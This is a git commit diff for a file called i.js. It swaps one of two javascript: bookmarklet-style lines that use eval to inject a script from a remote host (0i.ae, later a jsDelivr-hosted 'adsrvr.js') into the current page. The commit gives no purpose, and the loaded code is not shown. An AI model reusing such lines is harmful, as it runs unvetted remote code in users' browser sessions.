bc4c79daa34f245f5fd5578cef468fb414cc8d1b
lisalidbs <58355689+lisalidbs@users.noreply.github.com>
2024-11-20 16:08:57 +0800

    Update i.js

--- i.js
+++ i.js
@@ -1,2 +1,2 @@
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://0i.ae/online.htm\';document.body.appendChild(a)');
-javascript:eval('var timestamp=new Date().getTime(); var d=document.createElement("script"); d.src="https://0i.ae/adsrvr.htm?timestamp="+new Date().getTime(); document.body.appendChild(d);');
+javascript:eval('var timestamp=new Date().getTime(); var d=document.createElement("script"); d.src="https://cdn.jsdelivr.net/gh/lisalidbs/test@main/adsrvr.js?timestamp="+new Date().getTime(); document.body.appendChild(d);');
